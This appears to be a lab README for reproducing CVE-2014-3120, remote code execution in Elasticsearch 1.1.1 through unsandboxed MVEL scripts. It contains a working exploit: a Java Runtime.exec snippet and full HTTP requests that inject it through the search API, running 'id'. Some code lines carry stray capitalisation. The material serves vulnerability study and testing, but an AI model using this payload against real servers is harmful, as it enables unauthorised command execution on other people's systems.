# ElasticSearch Command Execution Vulnerability (CVE-2014-3120) Test Environment

Jre version: openjdk: 8-jre

Elasticsearch version: v1.1.1

## Principle

Related documents: http://bouk.co/blog/elasticsearch-rce/ , https://www.t00ls.net/viewthread.php?tid=29408

The old version of ElasticSearch supports incoming dynamic scripts (MVEL) to perform some complex operations, while MVEL can execute Java code without sandboxing, so we can execute arbitrary code directly.

The code for the MVEL execution command is as follows:

```java
Import java.io.*;
New java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next();
```

## Vulnerability Testing

Compile and run the environment:

```
Docker-compose build
Docker-compose up -d
```

Put the Java code into json:

```json
{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\" ).next();"
        }
    }
  }
```

First, the vulnerability requires at least one piece of data in es, so we need to create one piece of data first:

```
POST /website/blog/ HTTP/1.1
Host: your-ip: 9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
}
```

Then, execute arbitrary code:

```
POST /_search?pretty HTTP/1.1
Host: your-ip: 9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\" ).next();"
        }
    }
}
```

The results are as follows:

![](1.png)